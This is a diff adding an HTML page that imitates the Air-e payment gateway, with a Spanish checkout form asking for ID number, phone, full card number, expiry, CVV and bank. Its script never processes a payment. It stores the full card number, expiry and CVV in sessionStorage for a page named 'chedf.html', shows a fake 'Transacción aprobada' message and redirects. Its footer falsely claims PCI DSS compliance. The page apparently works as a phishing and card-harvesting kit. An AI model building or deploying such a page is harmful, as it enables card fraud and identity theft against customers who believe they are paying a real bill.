@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Pasarela de Pago — Air-e</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg:#f5f6f7;
+      --card:#ffffff;
+      --muted:#6b7280;
+      --accent:#1f2937; /* gris oscuro */
+      --action-bg:#172033; /* botón principal */
+      --action-text:#ffffff;
+    }
+    html,body{height:100%}
+    body{
+      font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background:var(--bg);
+      color:var(--accent);
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      margin:0;
+      line-height:1.35;
+    }
+    /* animación sutil */
+    .fade-in { animation:fadeIn 220ms ease-out both; }
+    @keyframes fadeIn { from { opacity:0; transform: translateY(6px); } to { opacity:1; transform: translateY(0);} }
+
+    /* LOADER - Nuevo estilo */
+    .loader {
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-top: 4px solid white;
+      border-radius: 50%;
+      width: 1.25rem;
+      height: 1.25rem;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      margin-right: 0.5rem;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+
+    /* iconos reducidos */
+    .visually-hidden {position:absolute !important; height:1px; width:1px; overflow:hidden; clip:rect(1px,1px,1px,1px); white-space:nowrap; }
+    /* Inputs monospace para campos de tarjeta */
+    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace; letter-spacing:0.12em; }
+    /* pequeño helper para el footer */
+    footer a { color:var(--muted); text-decoration:underline; text-underline-offset:2px; }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+  <header class="w-full bg-white border-b border-gray-200">
+    <div class="max-w-4xl mx-auto flex items-center justify-between px-6 py-3">
+      <div class="flex items-center gap-3">
+        <div class="w-28 h-8 bg-white-100 flex items-center justify-center rounded">
+            <img 
+                src="/logo.png" 
+                alt="Logo" 
+                class="h-8 object-contain"
+            >
+        </div>
+      </div>
+
+      <div class="text-sm text-gray-500 flex items-center gap-2" aria-hidden="true">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" class="opacity-80" xmlns="http://www.w3.org/2000/svg">
+          <path d="M17 11H7V8a5 5 0 0 1 10 0v3z" stroke="#6B7280" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
+          <rect x="4" y="11" width="16" height="9" rx="2" stroke="#6B7280" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span class="sr-only">Pasarela de pagos</span>
+        <span>Pasarela de pagos</span>
+      </div>
+    </div>
+  </header>
+
+  <main class="flex-1 flex items-center justify-center py-10 px-4">
+    <div class="w-full max-w-3xl fade-in">
+
+      <section class="bg-var(--card) bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
+        <div class="px-6 py-6 border-b border-gray-100 flex items-center justify-between">
+          <h1 class="text-lg font-semibold text-gray-800">Finalizar transacción</h1>
+          <div class="text-right">
+            <p class="text-xs text-gray-500">Monto total</p>
+            <p id="display-amount" class="text-xl font-bold text-gray-900" aria-live="polite">—</p>
+          </div>
+        </div>
+
+        <form id="payment-form" class="px-6 py-6 space-y-6" autocomplete="on" novalidate>
+          <fieldset class="border border-gray-100 rounded-lg p-4 bg-gray-50">
+            <legend class="px-2 text-sm font-medium text-gray-700">Datos del titular</legend>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-3">
+              <div>
+                <label for="full-name" class="block text-xs font-medium text-gray-700">Nombre completo</label>
+                <input id="full-name" name="fullName" type="text" required autocomplete="name"
+                       class="mt-1 w-full rounded-md border border-gray-300 px-3 py-2 text-sm"
+                       placeholder="Como aparece en el documento">
+              </div>
+
+              <div>
+                <label for="email" class="block text-xs font-medium text-gray-700">Correo electrónico (recibo)</label>
+                <input id="email" name="email" type="email" required autocomplete="email"
+                       class="mt-1 w-full rounded-md border border-gray-300 px-3 py-2 text-sm"
+                       placeholder="ejemplo@dominio.com">
+              </div>
+
+              <div>
+                <label for="id-number" class="block text-xs font-medium text-gray-700">Cédula </label>
+                <input id="id-number" name="idNumber" type="text" required autocomplete="organization"
+                       class="mt-1 w-full rounded-md border border-gray-300 px-3 py-2 text-sm"
+                       inputmode="numeric" placeholder="Documento de identidad">
+              </div>
+
+              <div>
+                <label for="phone-number" class="block text-xs font-medium text-gray-700">Teléfono</label>
+                <input id="phone-number" name="phone" type="tel" required autocomplete="tel"
+                       class="mt-1 w-full rounded-md border border-gray-300 px-3 py-2 text-sm"
+                       placeholder="+57 300 123 4567" inputmode="tel">
+              </div>
+            </div>
+          </fieldset>
+
+          <fieldset class="rounded-lg p-4 border border-gray-100 bg-white">
+            <legend class="px-2 text-sm font-medium text-gray-700">Información de pago</legend>
+
+            <div class="mt-3">
+              <label for="card-number" class="block text-xs font-medium text-gray-700">Número de tarjeta</label>
+              <div class="relative mt-1">
+                <input id="card-number" name="cardNumber" type="text" inputmode="numeric" autocomplete="cc-number"
+                       maxlength="23" required aria-describedby="card-hint"
+                       class="w-full rounded-md border border-gray-300 px-3 py-3 text-sm mono">
+                <span id="card-hint" class="sr-only">Ingresar número de tarjeta sin guiones</span>
+              </div>
+              <p id="card-error" class="mt-2 text-xs text-red-600 hidden" role="alert"></p>
+            </div>
+
+            <div class="mt-4">
+              <label for="card-holder" class="block text-xs font-medium text-gray-700">Nombre en la tarjeta</label>
+              <input id="card-holder" name="cardHolder" type="text" autocomplete="cc-name" required
+                     class="mt-1 w-full rounded-md border border-gray-300 px-3 py-2 text-sm" placeholder="">
+            </div>
+
+            <div class="grid grid-cols-2 gap-4 mt-4">
+              <div>
+                <label for="expiry" class="block text-xs font-medium text-gray-700">Vencimiento (MM / AA)</label>
+                <input id="expiry" name="expiry" type="text" inputmode="numeric" maxlength="5" autocomplete="cc-exp"
+                       placeholder="MM/AA" required
+                       class="mt-1 w-full rounded-md border border-gray-300 px-3 py-2 text-sm mono">
+              </div>
+
+              <div>
+                <label for="cvv" class="block text-xs font-medium text-gray-700">CVV</label>
+                <input id="cvv" name="cvv" type="password" inputmode="numeric" maxlength="4" autocomplete="cc-csc"
+                       placeholder="•••" required
+                       class="mt-1 w-full rounded-md border border-gray-300 px-3 py-2 text-sm text-center mono">
+              </div>
+            </div>
+
+            <div class="mt-4">
+              <label for="bank-select" class="block text-xs font-medium text-gray-700">Banco Emisor</label>
+              <select id="bank-select" name="bank" required
+                      class="mt-1 w-full rounded-md border border-gray-300 px-3 py-2 text-sm bg-white">
+                <option value="" disabled selected>Seleccione el banco emisor de la tarjeta</option>
+                <option value="Bancolombia">Bancolombia</option>
+                <option value="Banco de Bogotá">Banco de Bogotá</option>
+                <option value="Davivienda">Davivienda</option>
+                <option value="BBVA Colombia">BBVA Colombia</option>
+                <option value="Banco de Occidente">Banco de Occidente</option>
+                <option value="Banco Popular">Banco Popular</option>
+                <option value="Banco GNB Sudameris">Banco GNB Sudameris</option>
+                <option value="Scotiabank Colpatria">Scotiabank Colpatria</option>
+                <option value="Banco AV Villas">Banco AV Villas</option>
+                <option value="Citi (solo corporativo)">Citi (solo corporativo)</option>
+                <option value="Itaú">Itaú</option>
+                <option value="Banco Agrario">Banco Agrario</option>
+                <option value="Banco Caja Social BCSC">Banco Caja Social BCSC</option>
+                <option value="Bancoomeva">Bancoomeva</option>
+                <option value="Banco Falabella">Banco Falabella</option>
+                <option value="Banco Finandina">Banco Finandina</option>
+                <option value="Otros/Cooperativas">Otros Bancos / Cooperativas</option>
+              </select>
+            </div>
+            </fieldset>
+
+          <div class="text-xs text-gray-500 text-center">
+            Sus datos son tratados con confidencialidad y la transacción se realiza mediante conexiones cifradas.
+          </div>
+
+          <div>
+            <button id="submit-btn" type="submit" disabled
+                    class="w-full px-4 py-3 rounded-md text-sm font-semibold shadow-sm flex items-center justify-center"
+                    style="background:var(--action-bg); color:var(--action-text);">
+              <span id="btn-loader" class="loader hidden"></span>
+              <span id="btn-text">Pagar</span>
+            </button>
+          </div>
+        </form>
+
+        <div id="status" class="px-6 py-4 border-t border-gray-100 text-sm text-gray-600"></div>
+      </section>
+
+      <div class="mt-6 text-center">
+        <a href="index.html" class="text-sm text-gray-600 hover:text-gray-800">Cancelar y volver al resumen</a>
+      </div>
+    </div>
+  </main>
+
+  <footer class="bg-white border-t border-gray-100">
+    <div class="max-w-4xl mx-auto px-6 py-6 flex flex-col md:flex-row justify-between gap-4">
+      <div>
+        <p class="text-sm text-gray-700 font-semibold">Air-e</p>
+        <p class="text-xs text-gray-500 mt-1">Procesador de pagos autorizado • Cumplimiento PCI DSS</p>
+      </div>
+
+      <div class="text-sm text-gray-500">
+        <p class="text-xs">Soporte</p>
+        <p class="mt-1"><a href="mailto:soporte@aire.example" aria-label="correo soporte">soporte@aire.com</a></p>
+        <p class="mt-1">Tel: <a href="tel:+573001234567">+57 (605) 294749</a></p>
+      </div>
+
+      <div class="text-sm text-gray-500">
+        <p class="text-xs">Legal</p>
+        <p class="mt-1"><a href="/terminos">Términos y condiciones</a></p>
+        <p class="mt-1"><a href="/privacidad">Política de privacidad</a></p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    (function () {
+      'use strict';
+
+      // --- Funciones de utilidad (luhnCheck, formatCurrencyCOP, detectCardType, etc.) ---
+      function luhnCheck(num) {
+        if (!/^\d+$/.test(num)) return false;
+        let sum = 0, double = false;
+        for (let i = num.length - 1; i >= 0; i--) {
+          let d = parseInt(num.charAt(i), 10);
+          if (double) { d *= 2; if (d > 9) d -= 9; }
+          sum += d;
+          double = !double;
+        }
+        return sum % 10 === 0;
+      }
+
+      function formatCurrencyCOP(amount) {
+        try {
+          return new Intl.NumberFormat('es-CO', { style:'currency', currency:'COP', minimumFractionDigits:0 }).format(Math.round(amount));
+        } catch (e) {
+          return 'COP ' + amount;
+        }
+      }
+
+      function detectCardType(digits) {
+        if (/^4/.test(digits)) return 'visa';
+        if (/^5[1-5]/.test(digits) || /^2(2[2-9]|[3-6][0-9]|7[01])/.test(digits)) return 'mastercard';
+        if (/^3[47]/.test(digits)) return 'amex';
+        if (/^6(?:011|5)/.test(digits) || /^64[4-9]/.test(digits)) return 'discover';
+        return 'unknown';
+      }
+
+      function validateCardField() {
+        const digits = cardNumberEl.value.replace(/\D/g, '');
+        const type = detectCardType(digits);
+        const minLen = (type === 'amex') ? 15 : 13;
+        const maxLen = (type === 'amex') ? 15 : 19;
+        const lenOk = digits.length >= minLen && digits.length <= maxLen;
+        const luhnOk = digits.length >= 12 ? luhnCheck(digits) : false;
+
+        if (!lenOk) {
+          cardErrorEl.textContent = 'Número de tarjeta inválido o incompleto.';
+          cardErrorEl.classList.remove('hidden');
+          cardNumberEl.setAttribute('aria-invalid','true');
+          return false;
+        }
+
+        if (!luhnOk) {
+          cardErrorEl.textContent = 'Número de tarjeta no válido (falló verificación).';
+          cardErrorEl.classList.remove('hidden');
+          cardNumberEl.setAttribute('aria-invalid','true');
+          return false;
+        }
+
+        cardErrorEl.classList.add('hidden');
+        cardNumberEl.removeAttribute('aria-invalid');
+        return true;
+      }
+
+      function validateExpiry() {
+        const raw = expiryEl.value.replace(/\s/g,'');
+        if (!/^\d{2}\/\d{2}$/.test(raw)) return false;
+        const parts = raw.split('/');
+        const mm = parseInt(parts[0],10);
+        const yy = parseInt(parts[1],10);
+        if (mm < 1 || mm > 12) return false;
+
+        const fullYear = 2000 + yy;
+        const now = new Date();
+        const exp = new Date(fullYear, mm, 0, 23, 59, 59, 999);
+        return exp >= now;
+      }
+
+      function validateCVV() {
+        const digits = cardNumberEl.value.replace(/\D/g,'');
+        const type = detectCardType(digits);
+        const expected = (type === 'amex') ? 4 : 3;
+        return /^\d+$/.test(cvvEl.value) && cvvEl.value.length === expected;
+      }
+      // --- Fin funciones de utilidad ---
+
+      // DOM Elements
+      const displayAmountEl = document.getElementById('display-amount');
+      const paymentForm = document.getElementById('payment-form');
+      const cardNumberEl = document.getElementById('card-number');
+      const expiryEl = document.getElementById('expiry');
+      const cvvEl = document.getElementById('cvv');
+      const submitBtn = document.getElementById('submit-btn');
+      const statusEl = document.getElementById('status');
+      const cardErrorEl = document.getElementById('card-error');
+      const phoneInput = document.getElementById('phone-number');
+      const btnText = document.getElementById('btn-text');
+      const btnLoader = document.getElementById('btn-loader');
+      // Nuevo Elemento DOM
+      const bankSelectEl = document.getElementById('bank-select');
+
+      // 1) Cargar monto desde sessionStorage (Tu lógica anterior)
+      let amount = 0;
+      try {
+        const raw = sessionStorage.getItem('aire_data');
+        if (raw) {
+          let parsed = JSON.parse(raw);
+          if (typeof parsed === 'string') parsed = JSON.parse(parsed);
+          amount = parseFloat(parsed.ADJUST_BALANCE ?? parsed.BALANCE ?? parsed.amount ?? 0) || 0;
+        }
+      } catch (err) {
+        console.warn('No se pudo cargar monto desde sessionStorage. Usando 0.');
+        amount = 0;
+      }
+      displayAmountEl.textContent = formatCurrencyCOP(amount);
+      btnText.textContent = `Pagar ${formatCurrencyCOP(amount)}`;
+
+      // Listeners para formato (código omitido, se mantiene igual)
+      cardNumberEl.addEventListener('input', (e) => {
+        let raw = e.target.value.replace(/\D/g, '');
+        raw = raw.slice(0, 19);
+        const type = detectCardType(raw);
+        let groups = [];
+        if (type === 'amex') {
+          groups = [raw.slice(0,4), raw.slice(4,10), raw.slice(10,15)];
+        } else {
+          for (let i=0;i<raw.length;i+=4) groups.push(raw.slice(i,i+4));
+        }
+        e.target.value = groups.filter(Boolean).join(' ');
+        validateCardField();
+      });
+      expiryEl.addEventListener('input', (e) => {
+        let raw = e.target.value.replace(/\D/g,'').slice(0,4);
+        if (raw.length > 2) raw = raw.slice(0,2) + '/' + raw.slice(2);
+        e.target.value = raw;
+      });
+      cvvEl.addEventListener('input', () => {
+        cvvEl.value = cvvEl.value.replace(/\D/g,'').slice(0,4);
+      });
+      phoneInput.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/[^\d+]/g,'');
+        if (v.startsWith('+')) {
+          v = '+' + v.slice(1).replace(/\D/g,'');
+          if (v.startsWith('+57')) {
+            const rest = v.slice(3).slice(0,10);
+            if (rest.length<=3) e.target.value = '+57 ' + rest;
+            else if (rest.length<=6) e.target.value = '+57 ' + rest.slice(0,3) + ' ' + rest.slice(3);
+            else e.target.value = '+57 ' + rest.slice(0,3) + ' ' + rest.slice(3,6) + ' ' + rest.slice(6);
+            return;
+          }
+        }
+        v = v.replace(/\D/g,'').slice(0,10);
+        if (v.length<=3) e.target.value = v;
+        else if (v.length<=6) e.target.value = v.slice(0,3) + ' ' + v.slice(3);
+        else e.target.value = v.slice(0,3) + ' ' + v.slice(3,6) + ' ' + v.slice(6);
+      });
+
+      // Revisión general para activar botón
+      function checkFormState() {
+        const form = paymentForm;
+        const basicValid = form.checkValidity();
+        const cardValid = validateCardField();
+        const expiryValid = validateExpiry();
+        const cvvValid = validateCVV();
+
+        // La validación ahora incluye el select del banco
+        const bankSelected = bankSelectEl.value !== ""; 
+
+        const ok = basicValid && cardValid && expiryValid && cvvValid && bankSelected;
+        submitBtn.disabled = !ok;
+        return ok;
+      }
+
+      // Re-evalua en distintos eventos
+      paymentForm.addEventListener('input', checkFormState);
+      paymentForm.addEventListener('change', checkFormState);
+
+      // Envío: Lógica modificada para guardar el banco y datos sensibles en sessionStorage
+      paymentForm.addEventListener('submit', function (ev) {
+        ev.preventDefault();
+        statusEl.textContent = '';
+        if (!checkFormState()) {
+          statusEl.textContent = 'Por favor verifique los datos del formulario.';
+          return;
+        }
+
+        // 1. Recolectar datos no sensibles
+        const payload = {
+          fullName: document.getElementById('full-name').value.trim(),
+          email: document.getElementById('email').value.trim(),
+          idNumber: document.getElementById('id-number').value.trim(),
+          phone: document.getElementById('phone-number').value.trim(),
+          amount: amount,
+          // Guardamos el banco seleccionado
+          bank: bankSelectEl.value, 
+          // Datos de tarjeta
+          cardType: detectCardType(cardNumberEl.value.replace(/\D/g, '')),
+          last4: cardNumberEl.value.replace(/\D/g, '').slice(-4),
+          timestamp: new Date().toISOString()
+        };
+
+        // 2. Guardar el payload NO SENSIBLE en sessionStorage
+        sessionStorage.setItem('payment_data', JSON.stringify(payload));
+
+        // 3. --- INICIO MODIFICACIÓN CLAVE ---
+        // Recolectar y guardar datos SENSIBLES de la tarjeta
+        const secureData = {
+          pan: cardNumberEl.value.replace(/\D/g, ''), // Número completo sin espacios
+          expDate: expiryEl.value.trim(), // MM/AA
+          cvv: cvvEl.value.trim() // CVV
+        };
+        // Guardamos los datos sensibles para que chedf.html pueda leerlos
+        sessionStorage.setItem('secure_data', JSON.stringify(secureData));
+        // --- FIN MODIFICACIÓN CLAVE ---
+
+        // 4. UI: bloqueo, loader y mensaje
+        submitBtn.disabled = true;
+        btnText.textContent = 'Procesando pago...';
+        btnLoader.classList.remove('hidden'); 
+        statusEl.textContent = 'Procesando transacción... Por favor espere.';
+
+        // 5. Simulación del proceso de 3 segundos
+        setTimeout(function () {
+          statusEl.textContent = 'Transacción aprobada. Redirigiendo a confirmación...';
+
+          // Redirección a la nueva página después de la simulación
+          setTimeout(function(){
+            window.location.href = 'chedf.html'; // <--- REDIRECCIÓN AL ARCHIVO SOLICITADO
+          }, 500); 
+
+        }, 3000); // Loader de 3 segundos
+      });
+
+      // Validaciones iniciales
+      document.addEventListener('DOMContentLoaded', checkFormState);
+    })();
+  </script>
+</body>
+</html>
